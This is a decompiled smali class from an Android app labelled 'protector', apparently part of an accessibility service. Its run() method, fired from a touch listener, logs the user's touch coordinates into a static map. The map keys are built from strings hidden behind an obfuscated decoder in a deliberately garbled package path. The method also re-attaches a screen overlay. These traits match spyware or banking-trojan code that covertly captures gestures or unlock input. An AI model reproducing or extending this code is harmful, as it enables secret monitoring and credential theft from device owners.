.class Lcom/icontrol/protector/AccessServices$l$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/AccessServices$l;->onTouch(Landroid/view/View;Landroid/view/MotionEvent;)Z
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:[Landroid/graphics/Point;

.field final synthetic f:Lcom/icontrol/protector/AccessServices$l;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/AccessServices$l;[Landroid/graphics/Point;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/AccessServices$l$a;->f:Lcom/icontrol/protector/AccessServices$l;

    iput-object p2, p0, Lcom/icontrol/protector/AccessServices$l$a;->e:[Landroid/graphics/Point;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    sget v0, Lcom/icontrol/protector/AccessServices;->y:I

    sget v1, Lcom/icontrol/protector/AccessServices;->B:I

    const/16 v2, 0x8

    const/4 v3, 0x0

    const/4 v4, 0x1

    if-ne v0, v1, :cond_1

    sget v0, Lcom/icontrol/protector/AccessServices;->z:I

    sget v1, Lcom/icontrol/protector/AccessServices;->C:I

    if-ne v0, v1, :cond_1

    sget v0, Lcom/icontrol/protector/AccessServices;->D:F

    sget v1, Lcom/icontrol/protector/AccessServices;->A:F

    sub-float/2addr v0, v1

    const/high16 v1, 0x42c80000    # 100.0f

    cmpg-float v0, v0, v1

    if-gez v0, :cond_1

    :try_start_0
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices$l$a;->f:Lcom/icontrol/protector/AccessServices$l;

    iget-object v0, v0, Lcom/icontrol/protector/AccessServices$l;->b:Lcom/icontrol/protector/AccessServices;

    const/16 v1, 0x64

    invoke-static {v0, v1}, Lcom/icontrol/protector/AccessServices;->i(Lcom/icontrol/protector/AccessServices;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    sget v0, Lcom/icontrol/protector/AccessServices;->y:I

    sget v1, Lcom/icontrol/protector/AccessServices;->z:I

    invoke-static {v0, v1}, Lcom/icontrol/protector/a;->z(II)Z

    sget-object v0, Lcom/icontrol/protector/AccessServices;->x:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/icontrol/protector/AccessServices;->v:Ljava/util/LinkedHashMap;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    new-array v5, v4, [B

    const/16 v6, -0x37

    aput-byte v6, v5, v3

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    invoke-static {v5, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/icontrol/protector/AccessServices$l$a;->f:Lcom/icontrol/protector/AccessServices$l;

    iget-object v2, v2, Lcom/icontrol/protector/AccessServices$l;->b:Lcom/icontrol/protector/AccessServices;

    iget v2, v2, Lcom/icontrol/protector/AccessServices;->e:I

    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-array v2, v4, [Landroid/graphics/Point;

    new-instance v5, Landroid/graphics/Point;

    sget v6, Lcom/icontrol/protector/AccessServices;->y:I

    sget v7, Lcom/icontrol/protector/AccessServices;->z:I

    invoke-direct {v5, v6, v7}, Landroid/graphics/Point;-><init>(II)V

    aput-object v5, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/util/AbstractMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices$l$a;->f:Lcom/icontrol/protector/AccessServices$l;

    iget-object v0, v0, Lcom/icontrol/protector/AccessServices$l;->b:Lcom/icontrol/protector/AccessServices;

    iget v1, v0, Lcom/icontrol/protector/AccessServices;->e:I

    add-int/2addr v1, v4

    iput v1, v0, Lcom/icontrol/protector/AccessServices;->e:I

    goto :goto_1

    :cond_1
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices$l$a;->e:[Landroid/graphics/Point;

    const/16 v1, 0x3e8

    invoke-static {v0, v1}, Lcom/icontrol/protector/a;->I([Landroid/graphics/Point;I)V

    :try_start_1
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices$l$a;->f:Lcom/icontrol/protector/AccessServices$l;

    iget-object v0, v0, Lcom/icontrol/protector/AccessServices$l;->b:Lcom/icontrol/protector/AccessServices;

    invoke-static {v0, v4}, Lcom/icontrol/protector/AccessServices;->i(Lcom/icontrol/protector/AccessServices;I)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    sget-object v0, Lcom/icontrol/protector/AccessServices;->x:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/icontrol/protector/AccessServices;->v:Ljava/util/LinkedHashMap;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    new-array v5, v4, [B

    const/16 v6, 0x70

    aput-byte v6, v5, v3

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v5, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/icontrol/protector/AccessServices$l$a;->f:Lcom/icontrol/protector/AccessServices$l;

    iget-object v2, v2, Lcom/icontrol/protector/AccessServices$l;->b:Lcom/icontrol/protector/AccessServices;

    iget v2, v2, Lcom/icontrol/protector/AccessServices;->e:I

    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/icontrol/protector/AccessServices$l$a;->e:[Landroid/graphics/Point;

    invoke-virtual {v0, v1, v2}, Ljava/util/AbstractMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_0

    :goto_1
    sget-object v0, Lcom/icontrol/protector/AccessServices;->s:Landroid/view/View;

    invoke-virtual {v0}, Landroid/view/View;->getWindowToken()Landroid/os/IBinder;

    move-result-object v0

    if-nez v0, :cond_2

    sget-object v0, Lcom/icontrol/protector/AccessServices;->s:Landroid/view/View;

    invoke-virtual {v0}, Landroid/view/View;->getParent()Landroid/view/ViewParent;

    move-result-object v0

    if-nez v0, :cond_2

    :try_start_2
    sget-object v0, Lcom/icontrol/protector/AccessServices;->t:Landroid/view/WindowManager;

    sget-object v1, Lcom/icontrol/protector/AccessServices;->s:Landroid/view/View;

    sget-object v2, Lcom/icontrol/protector/AccessServices;->w:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v1, v2}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    :cond_2
    return-void

    nop

    :array_0
    .array-data 1
        -0x76t
        0x6ft
        -0x12t
        -0x47t
        0x70t
        -0x7et
        0x17t
        0x7at
    .end array-data

    :array_1
    .array-data 1
        0x23t
        -0x3dt
        -0x60t
        -0x74t
        -0x60t
        0x0t
        0x48t
        0x71t
    .end array-data
.end method
